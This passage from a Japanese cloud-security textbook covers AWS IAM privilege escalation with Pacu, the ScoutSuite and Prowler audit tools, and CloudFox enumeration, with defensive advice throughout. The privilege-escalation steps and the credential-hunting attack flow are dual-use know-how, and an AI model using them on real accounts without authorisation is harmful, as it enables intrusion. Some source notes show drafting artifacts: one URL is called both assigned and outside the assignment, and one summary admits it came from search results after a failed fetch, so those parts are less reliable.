`iam__privesc_scan` はここで `iam:Put*` の存在から昇格ベクトルを検出し、実行を許可すると`PutUserPolicy`を用いて管理者権限相当のインラインポリシーを自動的に作成・添付する。添付後に再度 `whoami` を実行すると、確認された権限が「すべてのリソースへの許可」を含む状態に変化していることが確認できる。ここでの教訓は、`Get*` や `List*` のような一見安全そうな読み取り系ワイルドカードに `Put*` を安易に混在させると、意図せず書き込み系の危険なAPI(この場合は自己へのポリシー付与)まで許可してしまうという、**ワイルドカード権限付与の危険性**である。

> 出典: Pwned Labs「Beginner's Guide: AWS IAM Privilege Escalation with Pacu」— https://pwnedlabs.io/blog/beginners-guide-to-hunting-for-aws-iam-privilege-escalations-with-pacu

### セッションデータの確認とレポート化

列挙・検証の過程でPacuに蓄積されたセッションデータは、次のコマンドでいつでも一覧できる。

```bash
pacu --session glc-pacu-cg-rollback --data all
```

```
Session data:
aws_keys: [
    <AWSKey: imported-raynor>
]
name: "glc-pacu-cg-rollback"
key_alias: "imported-raynor"
session_regions: [
    "us-east-1"
]
Account: {
    "account_id": "111122223333",
    "account_iam_alias": "<No IAM Alias defined>"
}
```

実務でIAM PrivEscを報告する際は、単に「昇格できた」で終わらせず、次の要素を必ず揃えることが望ましい。

| 記載項目 | 記入例 |
|---|---|
| 使用したコマンド/モジュール | `iam__enum_permissions` → `iam__privesc_scan --scan-only` |
| 開始時点のアイデンティティ | `arn:aws:iam::111122223333:user/raynor-cgidXXXXXXXX` |
| 確認された権限 | IAM Get/List + `iam:SetDefaultPolicyVersion` |
| 対象リソース | カスタマー管理ポリシー `cg-raynor-policy-cgidXXXXXXXX` |
| 観察された事実 | 非デフォルトバージョンv3が `*:*` を許可 |
| 結果 | デフォルトバージョンをv3に変更、`iam:CreateUser`が成功 |
| AWS上の証跡 | `get-policy-version`、`get-policy`、ユーザー作成/削除の記録 |
| CloudTrailでの裏付け | `SetDefaultPolicyVersion` および `CreateUser` イベントの有無 |
| 影響 | 開始時点の低権限ユーザーが、管理者権限で任意の操作を実行可能になる |

### よくあるトラブルとその原因

| 症状 | 主な原因 | 対処 |
|---|---|---|
| 列挙後に権限が全く見えない | 対象アイデンティティ自身がIAMポリシーを読み取る権限を持たない、SCPや条件句が存在、モジュールが未対応 | 管理者権限でアタッチ済みポリシーを直接確認する、列挙を再実行する、不明な点は「未確認」として扱い断定しない |
| Pacuが提示した昇格候補が実行時に失敗する | リソース単位の制限、Condition句、Permissions Boundary(権限境界)、信頼ポリシー、SCP、サービス固有の前提条件など、静的なポリシー解析では捉えきれない要素が存在 | ポリシードキュメントを再読する、AWS CLIで実際のAPIを正確にテストする、使用したモジュールのバージョンを記録しておく |
| 一時認証情報でエラーになる | STSのセッショントークンが未インポートまたは期限切れ | セッショントークンも含めて再インポートする、STSの出力を都度取得し直す |
| リージョン指定のモジュールが空の結果を返す | Pacuセッションのリージョン設定が対象と一致していない | `--set-regions` で正しいリージョン、または `all` を指定する |
| Pacuの結果とAWS CLIの結果が食い違う | セッションデータが古い、あるいは異なる認証情報を参照している | `whoami` と `aws sts get-caller-identity` の結果を突き合わせて一致を確認し、列挙をやり直す |
| 古いブログ記事のコマンドが通らない | Pacuのインストール方法やCLIフラグが版によって変わっている | 使用しているバージョンの `pacu --help` および各モジュールの `--module-info` で最新の仕様を必ず確認する |

> 出典: GoLinuxCloud「Pacu AWS Tutorial: IAM Enumeration, PrivEsc Scan & CloudGoat」— https://www.golinuxcloud.com/pacu-aws-exploitation/

### 防御側の視点: これらの経路をどう塞ぐか

本節で扱った2つのPrivEscパターンは、いずれもIAMポリシー設計における共通の失敗類型を示している。防御側が講じるべき対策は次のとおりである。

1. **最小権限の徹底**: `iam:Put*` や `iam:*` のようなワイルドカードでのアクション付与を避け、業務上必要な個別アクションのみを明示的に許可する。特にIAM関連の書き込み系アクション(`PutUserPolicy`、`AttachUserPolicy`、`CreatePolicyVersion`、`SetDefaultPolicyVersion` など)は、それ単体で権限昇格につながりうるため、付与前に必ず昇格経路の観点でレビューする。
2. **不要な権限昇格系アクションの削除**: `iam:SetDefaultPolicyVersion` は、ポリシーのロールバック運用に本当に必要な場合以外は付与しない。運用上必要な場合も、対象を特定のポリシーARNに絞る(`Resource`フィールドでワイルドカードを避ける)ことで影響範囲を限定できる。
3. **不要な古いポリシーバージョンの削除**: IAMポリシーは最大5世代のバージョンを保持できるが、過去に一時的に付与した高権限バージョンが削除されずに残っていると、それ自体が権限昇格の踏み台になる。定期的にポリシーバージョン履歴を棚卸しし、不要な高権限バージョンは `iam:DeletePolicyVersion` で削除する。
4. **AWS Access Analyzerや定期監査の活用**: AWS IAM Access Analyzerや、Pacu自身のようなツールを防御側が自ら定期的に実行し、権限昇格が可能な組み合わせが存在しないかを継続的に検査する。攻撃者が使うツールを防御側が先に自環境に対して実行する「purple team」的な運用は、この種の設定ミスの早期発見に有効である。
5. **Service Control Policies(SCP)による組織レベルの制御**: AWS Organizationsを利用している場合、SCPでアカウント全体に対して危険な昇格系アクションを制限することで、個々のIAMポリシーの設定ミスがあってもSCPが最終防波堤として機能する。
6. **CloudTrailによる監視**: `SetDefaultPolicyVersion`、`PutUserPolicy`、`AttachUserPolicy`、`CreatePolicyVersion` など昇格に直結するIAM書き込みイベントをCloudTrailで継続的に監視し、異常な発生パターン(例: 短時間での連続実行、通常業務では発生しないユーザーによる実行)にアラートを設定する。

これらの対策は個別の脆弱性を塞ぐというより、「IAMポリシーの実効権限は静的な一見からは把握しづらく、Pacuのようなツールによる能動的な検証を継続的に行わない限り見落とされやすい」という構造的な教訓に基づいている。防御側もまた、攻撃者と同じ列挙・スキャンの視点を定期的に自環境へ向けることが、この種の権限昇格経路を未然に発見する最も実践的な方法である。

> 出典: Pwned Labs「Beginner's Guide: AWS IAM Privilege Escalation with Pacu」— https://pwnedlabs.io/blog/beginners-guide-to-hunting-for-aws-iam-privilege-escalations-with-pacu

## マルチクラウド監査ツール（ScoutSuite/Prowler）

クラウド環境のセキュリティレビューを手作業で行うのは非現実的である。AWSだけでも数百のサービス・数千の設定項目があり、これを目視でチェックすることは事実上不可能であり、見落としが直接インシデントにつながる。そこで実務では、クラウドプロバイダのAPI経由でリソース構成を網羅的に収集し、既知のベストプラクティス（CISベンチマークなど）と突き合わせて自動的に問題点を洗い出す「クラウドセキュリティ設定監査（CSPM: Cloud Security Posture Management）」ツールを使う。本節では、その代表格である **ScoutSuite** と **Prowler** を取り上げ、それぞれの仕組み・使い方・レポートの読み方を、防御目的（自組織のクラウド環境の点検・監査・是正）の観点から解説する。

なお、本節で紹介するツールは自分が管理権限を持つ、または監査の許可を得ているクラウドアカウントに対してのみ実行すること。第三者のクラウド環境に無許可でこれらのツールを実行する行為は不正アクセスに該当しうる。

### なぜ「設定監査ツール」が必要なのか

クラウドのセキュリティ問題の大半は、脆弱性というより「設定ミス（misconfiguration）」である。たとえば以下のような項目は、コードのバグではなく単なる設定値の誤りだが、深刻な侵害につながる。

- S3バケットが`public-read`になっている
- セキュリティグループが`0.0.0.0/0`で全ポート開放されている
- IAMユーザーにMFAが設定されていない、または強力すぎる権限（`*:*`）が付与されている
- CloudTrail（監査ログ）が無効、あるいは特定リージョンのみ有効
- KMSキーのローテーションが無効
- RDS/データベースが暗号化されていない、またはパブリックアクセス可能

これらは1アカウント・1リージョンだけでも数百項目に及び、マルチアカウント・マルチクラウド（AWS + Azure + GCPを併用する組織は珍しくない）になると人手でのレビューは破綻する。ScoutSuiteとProwlerはいずれも、この「構成のスナップショットを取得し、ルールセットと照合し、重大度付きでレポートする」という共通の設計思想を持つが、アーキテクチャと得意分野が異なる。両者を併用して相互に見落としをカバーする運用も一般的である。

### ScoutSuite（NCC Group）——設定の可視化に強いオープンソース監査ツール

#### 概要と対応プロバイダ

ScoutSuiteはNCC Group（セキュリティコンサルティング企業）が開発しているオープンソースの「Multi-Cloud Security Auditing Tool」である。Pythonで実装されており、以下のプロバイダに対応する。

- Amazon Web Services（AWS）
- Microsoft Azure
- Google Cloud Platform（GCP）
- Alibaba Cloud（アルファ版）
- Oracle Cloud Infrastructure（アルファ版）
- Kubernetesクラスタ（アルファ版）
- DigitalOcean（アルファ版）

正式サポートはAWS/Azure/GCPの3大クラウドで、それ以外は開発途上（アルファ版）という位置づけである。

> 出典: ScoutSuite (GitHub) — https://github.com/nccgroup/ScoutSuite

#### 動作原理（仕組みレベル）

ScoutSuiteの処理は大きく3段階に分かれる。

1. **収集（Collection）**: 各クラウドの公式SDK（AWSならboto3、Azureならazure-sdk-for-python、GCPならgoogle-api-python-client）を通じて、対象アカウントの全リソース設定をAPI呼び出しで取得する。IAMポリシー、セキュリティグループ、S3バケットACL、RDSインスタンス設定など、サービスごとに定義された「収集モジュール」が並列にAPIを叩き、結果をJSON形式の内部データモデルにまとめる。これは**読み取り専用のAPI呼び出しのみ**で完結し、対象リソースを変更することはない（したがって本番環境に対しても比較的安全に実行できる、いわゆるパッシブスキャンである）。
2. **評価（Rule engine）**: 収集したJSONデータに対して、`ScoutSuite/data/rules`配下に定義されたルール（JSON形式のルール定義ファイル）を適用する。各ルールは「どのデータパスの、どのフィールドが、どの条件を満たしたら検出（finding）とするか」を宣言的に記述しており、ルールごとに重大度（`danger`＝高リスク、`warning`＝注意）が付与されている。たとえば「セキュリティグループのインバウンドルールで0.0.0.0/0からポート22（SSH）が開放されている」といった条件がルールとして定義されている。このルールベース方式により、AWS APIレスポンスの生データを人間が読む代わりに、既知のアンチパターンに機械的にマッチさせて検出できる。
3. **レポート生成**: 評価結果を単一のHTMLファイル（JavaScriptによるインタラクティブなダッシュボード）として出力する。サービス別・重大度別にfindingsを一覧・フィルタでき、該当リソースの詳細（ARNや設定値そのもの）までドリルダウンできる。レポートはローカルファイルとして生成されるため、外部にデータを送信せずオフラインで結果を精査できる点が特徴である。

#### 認証方法（実行に必要な権限）

ScoutSuiteは対象クラウドの「読み取り専用」の認証情報があれば実行できる。

- **AWS**: ローカルの`~/.aws/credentials`（AWS CLIの標準的な認証情報チェーン）、環境変数（`AWS_ACCESS_KEY_ID`等）、IAMロール（EC2インスタンスプロファイルやAssumeRole）を利用する。実務上は、AWS管理ポリシー`SecurityAudit`や`ReadOnlyAccess`をアタッチした専用のIAMロール/ユーザーを用意し、それでスキャンを実行するのが安全なプラクティスである。
- **Azure**: Azure CLI (`az login`) によるログイン状態、またはサービスプリンシパル（クライアントID/シークレット/テナントID）を利用する。
- **GCP**: サービスアカウントのJSONキーファイル、またはgcloud CLIのデフォルト認証情報（Application Default Credentials）を利用する。

いずれの場合も、書き込み権限は不要であり、監査専用の最小権限アカウントを用意することが強く推奨される（過剰な権限を持つ認証情報を監査ツールに使わせること自体が新たなリスクになるため）。

#### 除外設定（Exceptions）とカスタムルール

大規模な組織では、意図的に許容しているリスク（例: このS3バケットは公開Webサイトホスティング用途で意図的にpublicにしている）が存在する。ScoutSuiteは`exceptions.json`のような除外設定ファイルにより、特定のリソースIDやルールを対象外にすることができ、継続的なスキャンにおける「既知の誤検知（既知でリスク許容済みの項目）」のノイズを減らせる。また、ルールはJSONで宣言的に書かれているため、組織固有のポリシー（例: 特定タグが付いていないリソースは検出対象にする）をカスタムルールとして追加することも可能である。

#### 実務上の位置づけ

ScoutSuiteは「一時点のスナップショット評価（point-in-time assessment）」に強く、視覚的に分かりやすいHTMLレポートで経営層やインフラチームへの報告に使いやすい。一方で、継続的な自動化（CI/CDパイプラインへの組み込みやコンプライアンスフレームワークとの厳密な対応付け）という点では、後述のProwlerの方が機能が豊富である。

### Prowler——コンプライアンス評価とCI/CD統合に強いオープンソースプラットフォーム

#### 概要

Prowlerは「世界で最も広く使われているオープンソースのクラウドセキュリティプラットフォーム」を標榜するツールで、AI駆動の評価・ダッシュボード・レポート・外部連携機能を備え、クラウドセキュリティ運用の自動化を目的としている。元々はAWS環境のCISベンチマーク評価スクリプト（bashベース）として始まったが、現在はPythonで書き直され、マルチクラウド・マルチプラットフォーム対応の統合プラットフォームへと発展している。

> 出典: Prowler (GitHub) — https://github.com/prowler-cloud/prowler

#### 対応プロバイダとチェック数（2026年時点の公開情報）

Prowlerは13以上のプロバイダに対応しており、代表的な内訳は以下の通りである（チェック数・サービス数は開発の進行に伴い増減するため、実行時に`--list-checks`で最新の一覧を確認することが望ましい）。

| プロバイダ | チェック数 | サービス数 |
|---|---|---|
| AWS | 662 | 86 |
| Azure | 191 | 22 |
| GCP | 110 | 20 |
| Kubernetes | 92 | 7 |
| Microsoft 365 | 144 | 10 |
| GitHub | 24 | 3 |
| Oracle Cloud Infrastructure | 52 | 14 |
| Alibaba Cloud | 63 | 9 |

これ以外にもCloudflare、MongoDB Atlas、Google Workspace、OpenStack、Vercel、Infrastructure as Code（Terraformなどのコード自体の静的チェック）などをカバーしている。AWSのチェック数が突出して多いのは、Prowlerの出自がAWS向けCISベンチマークツールであることの名残であり、AWS環境の監査においては特に網羅性が高い。

#### 動作原理

基本的な設計思想はScoutSuiteと同様に「API経由でリソース設定を収集→ルール（チェック）と照合→レポート生成」だが、Prowlerはチェックを**Pythonのプラグイン形式**で実装している点が異なる。各チェックは独立したPythonモジュールとして書かれており、`prowler/providers/<provider>/services/<service>/<check_name>/`のようなディレクトリ構造で管理される。この設計により、コミュニティが新しいチェックをプルリクエストとして追加しやすく、チェック数の急速な拡大（AWSだけで600超）につながっている。各チェックはPASS/FAIL/MANUALのステータスと重大度（`critical`/`high`/`medium`/`low`/`informational`）を返す。

#### コンプライアンスフレームワーク対応

Prowlerの大きな強みは、個々のチェックを**50以上のコンプライアンスフレームワーク**にマッピングしている点である。

- 業界標準: CIS Benchmarks、NIST 800-53、NIST CSF、MITRE ATT&CK
- 規制要件: PCI-DSS、FedRAMP、NIS2
- データ保護: GDPR、HIPAA
- ガバナンス: SOC2、ISO 27001
- クラウド固有: AWS Well-Architected Framework、AWS Foundational Technical Review（FTR）
- 国別基準: ENS（スペイン）、KISA ISMS-P（韓国）等

これにより、単に「危険な設定を見つける」だけでなく、「このアカウントはPCI-DSS要件のうち何%を満たしているか」といった監査報告書に直結する形で結果を出力できる。

#### インストールと実行

CLI版はpipで導入できる。

```bash
pip install prowler
prowler -v
```

Dockerや、GitHubリポジトリをクローンして`uv sync`で依存関係を解決する方法もサポートされている。自組織で継続的に使う場合はDocker Compose構成の「Prowler Local Server」（Next.js製UI + Django REST Framework製API + PostgreSQL等から成るセルフホスト版）をデプロイし、Web UIからスキャンを管理・可視化する構成も提供されている。

実行の基本構文は次の通りである。

```bash
# デフォルトのAWSプロファイルでフルスキャン
prowler aws

# 特定プロファイル・特定サービスのみスキャン
prowler aws --service iam --profile prod-readonly

# 重大度がcritical/highのみを抽出し、JSONで出力
prowler aws --severity critical high --output-formats json

# CIS 2.0ベンチマークのみ評価
prowler aws --compliance cis_2.0_aws

# 利用可能なチェック一覧・サービス一覧・コンプライアンス一覧を確認
prowler aws --list-checks
prowler aws --list-services
prowler aws --list-compliance
```

`--severity`や`--compliance`で対象を絞り込めるのは、実運用上重要である。フルスキャンは数百のAPI呼び出しを伴い時間がかかるため、日次の自動実行では「critical/highのみ」、月次の詳細監査では「フルスキャン＋特定コンプライアンス」といった使い分けが一般的である。

出力形式はテキスト、CSV、JSON、JSON-OCSF（Open Cybersecurity Schema Framework、セキュリティ製品間でのデータ連携を目的とした標準スキーマ）、JUnit-XML、SARIF（Static Analysis Results Interchange Format）、HTMLなど多岐にわたる。特にSARIF出力はGitHubのSecurityタブに直接アップロードでき、CI/CDパイプラインに組み込んでプルリクエストの段階でクラウド構成ドリフト（Infrastructure as Codeの変更が意図しないセキュリティ低下を招いていないか）を検知する用途に使える。GitHub Actionsでの利用例は以下の通りである。

```yaml
- uses: prowler-cloud/prowler@5.25
  with:
    provider: iac
    output-formats: sarif json-ocsf
    upload-sarif: true
    flags: --severity critical high
```

#### Prowler ThreatScoreとAttack Paths

Prowlerは単純な「PASS/FAILの数」だけでなく、重み付けされたリスクスコアリング（Prowler ThreatScore）により、多数の低リスク検出に埋もれず本当に危険な問題を優先表示する機能を持つ。また、AWSスキャン完了後には、Cartography由来のクラウドインベントリとProwlerの検出結果を組み合わせ、Neo4j（またはAmazon Neptune）上に「攻撃経路グラフ（Attack Paths）」を自動生成する機能もある。これは「単体では低リスクに見える複数の設定不備が組み合わさることで、外部から特権昇格・水平展開が可能になる経路」を可視化するもので、個々のチェック結果を眺めるだけでは見えないリスクの連鎖を把握するのに役立つ。

> 出典: Prowler公式ドキュメント — https://docs.prowler.com/

#### 実行に必要な権限

AWSの場合、AWS管理ポリシーの`SecurityAudit`（AWSが提供する読み取り専用の監査用ポリシー）に加え、一部のチェック（S3バケットポリシーの詳細確認など）では追加の読み取り権限が必要になることがある。ScoutSuiteと同様、書き込み権限を持たない最小権限の認証情報で実行するのが原則であり、CI/CDに組み込む場合はOIDC連携によるAssumeRole（長期キーを保存しない）方式が推奨される。

### ScoutSuiteとProwlerの使い分け

| 観点 | ScoutSuite | Prowler |
|---|---|---|
| 主眼 | 設定の可視化・レビュー用HTMLダッシュボード | コンプライアンス適合率の測定・CI/CD統合 |
| コンプライアンスマッピング | 限定的 | 50以上のフレームワークに対応 |
| チェックの拡張性 | JSONルールファイル | Pythonプラグイン、コミュニティ寄稿が活発 |
| 出力形式 | HTML中心 | text/CSV/JSON/JSON-OCSF/SARIF/HTML等、多様 |
| 自動化・CI連携 | 限定的 | GitHub Actions等との統合が充実 |
| 商用版 | なし（OSSのみ） | Prowler Cloud（マネージドSaaS）あり |

実務では、初回の全体像把握や役員向け報告にはScoutSuiteのビジュアルなレポートが分かりやすく、継続的な自動監査・監査証跡としてのコンプライアンスレポート作成・CI/CDへの組み込みにはProwlerが適している。両方を定期実行し、片方でしか検出されない問題を突き合わせる「二重チェック」体制を敷く組織も少なくない。

### 導入・運用上の注意点（防御目的での活用にあたって）

1. **最小権限の監査用認証情報を用意する**: 監査ツール自体が攻撃者に狙われる侵入経路にならないよう、読み取り専用ロール・キーのローテーション・利用ログの監視を徹底する。
2. **誤検知（False Positive）を前提に運用する**: どちらのツールも「既知の一般的なアンチパターン」に基づく静的なルール判定であり、組織固有の文脈（意図的な公開設定など）は考慮されない。除外設定やタグベースの例外運用を整備しないと、アラート疲れを招き本当に重要な検出を見逃す原因になる。
3. **findingsを継続的にトラッキングする**: 単発のスキャンで終わらせず、Issue管理システムやチケットに連携し、是正までのリードタイムを追跡する運用にして初めて「監査ツール」が「セキュリティ改善プロセス」として機能する。
4. **許可された環境でのみ実行する**: 本節冒頭で述べた通り、これらのツールはあくまで自組織が権限を持つアカウントに対して使うものであり、第三者環境や許可のない本番環境への実行は、たとえ読み取り専用であっても契約・法令違反となりうる。

## CloudFoxのリリースとGCP対応

クラウド環境の列挙（enumeration、対象システムの構成・リソース・権限などを能動的に調べ上げる作業）は、ペネトレーションテストにおいて最初のボトルネックになりやすい。AWSひとつを取っても、IAM（Identity and Access Management、権限管理サービス）のロール、EC2インスタンス、S3バケット、Lambda関数、RDSデータベースなど、確認すべきリソース種別は数十に及ぶ。従来はこれを`aws cli`＋`jq`（JSONを整形・抽出するコマンドラインツール）＋`grep`／`awk`／`sed`の組み合わせで力技に行っていたが、Bishop Fox（米国のオフェンシブセキュリティ専門企業）はこの作業を統合的に自動化するオープンソースツール「CloudFox」を公開した。本節では、CloudFoxがどのような設計思想で作られ、どのように使われ、後にGCP（Google Cloud Platform）へ対応を広げていったのかを、原典に基づいて解説する。

### CloudFoxとは何か——「クラウド版PowerView」という設計思想

CloudFoxは、公式には次のように定義されている。

> A collection of enumeration commands that illuminate attack paths for cloud penetration testing.
> （クラウドペネトレーションテストにおける攻撃経路を可視化するための、列挙コマンド群）

開発者のSeth ArtとCarlos Vendramini（ともにBishop Foxのコンサルタント）が掲げた開発動機は明確で、「クラウドインフラ版のPowerViewを作る」ことだった。PowerView（PowerSploit/Empireプロジェクトの一部として知られるActive Directory列挙用PowerShellツール）は、AD環境内のユーザー・グループ・信頼関係・ACL（アクセス制御リスト）などを高速に列挙し、攻撃者視点で「次にどこを狙えば権限昇格やラテラルムーブメント（水平展開）につながるか」を示すツールとして、レッドチームの現場で広く使われてきた。CloudFoxはこの思想をクラウド環境に持ち込み、「見慣れないクラウド環境でも、状況認識（situational awareness）を素早く獲得できるようにする」ことを目的としている。

> ⚠️ 本節の担当URLの一つであるBishop Fox公式ブログ「Introducing Bishop Fox Security Tool: CloudFox」は担当URL外だが、初出時点（AWS専用リリース時）の設計原則を理解するための背景情報として、直接取得できた範囲で以下に要約する（以下は取得できた一次情報に基づく解説）。

#### 読み取り専用（read-only）という設計上の制約

CloudFoxの最も重要な設計原則は、すべてのコマンドが**読み取り専用**であるという点である。内部的には`Describe*`・`Get*`・`List*`系のAPIのみを呼び出し、環境の状態を変更する操作（作成・更新・削除）は一切行わない。これにより、AWSの管理ポリシーである`SecurityAudit`（監査用の読み取り専用マネージドポリシー）を付与したIAMユーザー／ロールだけでCloudFoxをフル活用できる。ペネトレーションテストの現場では、顧客から付与される権限が「読み取り専用の監査ロール」に限定されるケースが多いため、この設計は現実の運用制約に即している。防御側の観点で言えば、監査ログ（CloudTrailなど）にCloudFoxの実行痕跡が残った場合でも、それは大量の`Describe`/`List`系APIコール（多くの場合、短時間に多数のリージョンへ発行される）として観測できる、という検知のヒントにもなる。

#### 「グループ化されたコマンド」による効率化

CloudFoxのもう一つの特徴は、意味的に関連するAPIコールを1つのコマンドにまとめている点である。例えば`endpoints`コマンドは、ELB（Elastic Load Balancer）とCloudFrontディストリビューションのエンドポイントを一度に列挙する。素の`aws cli`であれば`describe-load-balancers`と`list-distributions`を別々に呼び、結果を手動で突き合わせる必要があるが、CloudFoxはこれを1コマンドで済ませ、外部公開されている攻撃対象領域（アタックサーフェス）を一覧化する。

代表的なコマンド群（初出時点でAWSを対象に提供されていたもの）は以下の通りである。

```
cloudfox aws inventory        # 全リージョンのリソース数を把握し、環境の規模感をつかむ
cloudfox aws instances        # EC2インスタンスのIPアドレスやロールを抽出
cloudfox aws ecr              # ECR(コンテナレジストリ)のイメージ情報と取得コマンドを提示
cloudfox aws env-vars         # Lambda関数の環境変数をスキャン(認証情報の混入を探す)
cloudfox aws endpoints        # ELB/CloudFrontなど外部公開エンドポイントを列挙
cloudfox aws iam-simulator    # IAMポリシーシミュレーションで実効権限を確認
cloudfox aws permissions      # ロールにアタッチされた権限を詳細分析
```

なぜこの設計が攻撃経路の発見に直結するのか。典型的な悪用フローとして紹介されているのが次のパターンである。

1. `env-vars`コマンドでLambda関数の環境変数を横断スキャンし、RDS（Relational Database Service）の接続文字列やパスワードが平文で埋め込まれていないかを探す。
2. 見つかった認証情報がどのRDSインスタンスに対応するかを、CloudFoxの出力（ロータイルファイル＝「次に何をすべきか」のヒントを含む中間ファイル）から特定する。
3. `endpoints`コマンドで、そのRDSインスタンスがパブリックサブネットに置かれ、インターネットから到達可能になっていないかを確認する。
4. `iam-simulator`や`permissions`で、その認証情報を使ってどこまでアクセスできるか（読み取りだけか、書き込みや他リソースへの横展開が可能か）を検証する。

この一連の流れは、単体では見過ごされがちな「設定ミスの組み合わせ」（Lambdaの環境変数管理の甘さ＋RDSのネットワーク配置ミス＋過剰なIAM権限）が、実際にはひとつながりの攻撃経路になることを示す典型例であり、CloudFoxが「PowerViewのように攻撃経路を可視化する」と謳う所以である。

出力面では、結果をテーブル表示・CSV出力のどちらでも得られるほか、自動的にディスクへ保存されるファイル群の中には、`nmap`などの外部ツールへそのまま渡せる入力ファイルや、発見事項に対する次のアクション（推奨される追加調査コマンドなど）を記したファイルが含まれる。これはCloudFoxが単体の列挙ツールで完結するのではなく、既存のペネトレーションテストのツールチェーン（`nmap`によるポートスキャン、`aws cli`による追加調査など）に組み込まれる前提で設計されていることを示している。

> 出典: Introducing Bishop Fox Security Tool: CloudFox — https://bishopfox.com/blog/introducing-cloudfox

### Bishop Foxによるリリース発表と業界の反応

CloudFoxの一般公開は、セキュリティメディアでも報じられた。Dark Readingの記事「Bishop Fox Releases Cloud Enumeration Tool CloudFox」は、次のように趣旨をまとめている。

CloudFoxは、クラウドペネトレーションテスターおよびオフェンシブセキュリティの専門家向けに作られたコマンドラインツールであり、クラウドペンテストに不慣れな担当者でも扱えるよう、列挙コマンド群を簡潔にまとめている点が特徴として紹介されている。開発の主な着想源は、AD環境向けのPowerViewを参考に「クラウドインフラ版のPowerView」を作ることだったと、開発者であるSeth ArtおよびCarlos Vendramini（いずれもBishop Foxのコンサルタント）の言葉として引用されている。

具体的なユースケースとして記事が挙げているのは、RDS（Amazon Relational Database Service）に紐づく認証情報を探し出し、それに対応する具体的なデータベースインスタンスを特定し、さらにその認証情報にアクセスできるユーザーを洗い出す、という一連の自動化作業である。これはBishop Fox公式ブログで紹介されているワークフロー（Lambda環境変数→RDS特定→権限検証）と実質的に同じ内容であり、CloudFoxの核となるユースケースとして繰り返し取り上げられていることが分かる。

記事はまた、CloudFoxの全コマンドが読み取り専用であり、実行してもクラウド環境の状態を一切変更しないという点を明記している。これは前述の設計原則（`SecurityAudit`ポリシーでの運用が可能）と一致する内容であり、ペネトレーションテスト実施時に「意図せず対象環境に副作用を与えてしまうリスク」を抑える設計であることが、ツール開発者側だけでなく報道側の視点からも強調されている点は重要である。

対応プラットフォームについては、記事の時点でCloudFoxが**AWS（Amazon Web Services）およびGCP（Google Cloud Platform）に対応している**ことが明記されている。これは、CloudFoxが当初AWS専用ツールとして公開され、ロードマップとしてAzure・GCP・Kubernetesへの対応拡大を掲げていた経緯（前掲のBishop Foxブログの内容）を踏まえると、報道時点までにGCP対応が実装され、マルチクラウド列挙ツールへと発展していたことを示す一次情報として重要である。

> 出典: Bishop Fox Releases Cloud Enumeration Tool CloudFox — https://www.darkreading.com/cloud-security/bishopfox-releases-cloud-enumeration-tool-cloudfox
（本URLへの直接アクセスはWebFetchで403エラーとなり自動取得がブロックされたため、代替として同一記事に対するWeb検索結果の要約から上記内容を抽出した。）

### GCP対応の意味——なぜマルチクラウド化が重要なのか

CloudFoxがAWS単体のツールからAWS／GCP双方に対応するマルチクラウドツールへと発展した背景には、実務上の必然性がある。ペネトレーションテストの対象組織は、単一のクラウドベンダーにロックインされているとは限らない。むしろ、M&A（企業合併・買収）や部門ごとの技術選定の違いにより、AWSとGCPを併用しているケース、あるいはAzureを含む3社構成のケースは珍しくない。列挙ツールがAWS専用のままでは、テスターはGCP側を別のツール（`gcloud`コマンド＋手動のjq処理など）で個別に調査せねばならず、CloudFoxが解決しようとした「点在するコマンドの統合」という当初の課題が、クラウド境界をまたいだ形で再発してしまう。

GCP対応によってCloudFoxが提供する価値は、AWS版と同じ設計原則——読み取り専用・攻撃経路志向・グループ化されたコマンド——をGCPのリソースモデル（プロジェクト、IAMポリシー、Compute Engineインスタンス、Cloud Storageバケット、Cloud Functionsなど）に対しても適用できる点にある。AWSのIAMロールに相当する概念がGCPでは「サービスアカウント」であり、AWSのS3バケットに相当するのが「Cloud Storageバケット」であるように、クラウドベンダーごとにリソースの呼び方や権限モデルの詳細は異なる。CloudFoxのようなツールが両方に対応することは、テスターが「AWSの列挙手順をGCP向けに毎回翻訳し直す」という認知的コストを削減し、結果として攻撃経路の発見を高速化することに直結する。

### 防御側にとっての示唆

本教科書は防御目的で記述しているため、CloudFoxのようなツールの存在は「攻撃者・レッドチームが何を自動化しているか」を知るための情報として捉えるべきである。防御側（ブルーチーム／クラウドセキュリティ担当）が押さえておくべき要点は次の通りである。

- CloudFoxのようなツールが探索する典型的な弱点——Lambda環境変数への認証情報のハードコード、パブリックサブネットに配置されたデータベース、過剰なIAM権限——は、そのまま自組織のクラウド環境の点検項目になる。CloudTrail（AWS）やCloud Audit Logs（GCP）で、短時間に大量の`Describe`/`List`/`Get`系API呼び出しが特定の認証情報から発行されていないかを監視することは、読み取り専用ツールによる偵察活動の検知に有効である。
- CloudFoxが「グループ化されたコマンド」で効率化しているのと同じ理由で、防御側もリソースを横断した棚卸し（インベントリ）を定期的に自動化し、「どのLambda関数が環境変数に機密情報を持っているか」「どのデータベースが意図せず外部公開されているか」を継続的に可視化しておくことが望ましい。
- 監査用の読み取り専用ロール（`SecurityAudit`相当）であっても、大量の情報を収集できてしまう点には注意が必要である。読み取り専用＝安全、という単純な図式ではなく、「読み取れる情報の粒度・範囲」自体が攻撃者にとっての偵察材料になりうることを踏まえ、監査ロールの権限も最小権限の原則（必要な範囲に限定する原則）に基づいて設計する必要がある。

### まとめ

CloudFoxは、Bishop Foxのコンサルタント陣が「クラウド版PowerView」を目指して開発した、読み取り専用のクラウド列挙・攻撃経路可視化ツールである。当初はAWSのみに対応していたが、開発ロードマップに掲げられていた通り、後にGCPへの対応を実装し、マルチクラウド環境でのペネトレーションテストを支援するツールへと発展した。学習用途としては、Bishop Foxが別途提供する意図的に脆弱なAWS環境「CloudFoxable」（CTF形式のハッキングサンドボックス）と組み合わせることで、CloudFoxの各コマンドが実際にどのような攻撃経路の発見につながるかを、防御的な学習環境の中で安全に確認できる。実運用にあたっては、許可を得た範囲・自組織が管理する環境でのみ使用し、無許可の第三者環境に対して実行しないことが大前提となる。

> 出典: CloudFox: Find Exploitable Attack Paths in Cloud… — https://bishopfox.com/tools/cloudfox-tool
> 出典: Bishop Fox Releases Cloud Enumeration Tool CloudFox — https://www.darkreading.com/cloud-security/bishopfox-releases-cloud-enumeration-tool-cloudfox


---

[← 第7章 露出クレデンシャル・シークレットのRecon](07-secret-recon.md) ｜ [目次](index.md) ｜ [第9章 実例・ライトアップ・報奨事例 →](09-real-world-cases.md)
